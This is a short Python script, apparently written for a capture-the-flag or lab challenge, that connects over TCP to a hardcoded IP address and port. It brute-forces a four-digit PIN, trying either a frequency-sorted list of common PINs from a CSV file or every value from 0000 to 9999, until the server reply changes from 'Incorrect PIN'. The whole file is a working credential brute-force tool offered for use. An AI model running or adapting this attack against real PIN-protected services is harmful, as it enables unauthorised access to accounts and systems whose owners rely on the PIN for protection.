import sys, socket, csv

if __name__ == "__main__":
    server = "51.195.253.124"
    port = 12345
    mode = 1
    pin_found = False

    ma_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        ma_socket.connect((server, port))
    except Exception as e:
        print("Problème de connexion", e.args)
        sys.exit(1)

    ligne = ma_socket.recv(1024)
    print(ligne)

    if mode == 0:
        with open('four-digit-pin-codes-sorted-by-frequency-withcount.csv', newline='') as csvfile:
            spamreader = csv.reader(csvfile, delimiter=',')
            for pin, _ in spamreader:
                ma_socket.sendall(bytes(pin, 'utf-8'))
                ligne = str(ma_socket.recv(1024))
                if not ligne == "b'Incorrect PIN\\n'":
                    print(f"PIN FOUND : {pin}")
                    print(ligne)
                    pin_found = True
                    break
    else:
        for i in range(1000):
            ma_socket.sendall(bytes(str(i).zfill(4), 'utf-8'))
            ligne = str(ma_socket.recv(1024))
            if not ligne == "b'Incorrect PIN\\n'":
                print(f"PIN FOUND : {i}")
                print(ligne)
                pin_found = True
                break

        if not pin_found:
            for i in range(1000, 10000):
                ma_socket.sendall(bytes(str(i), 'utf-8'))
                ligne = str(ma_socket.recv(1024))
                if not ligne == "b'Incorrect PIN\\n'":
                    print(f"PIN FOUND : {i}")
                    print(ligne)
                    pin_found = True
                    break

    if not pin_found:
        print("PIN NOT FOUND (how ???)")

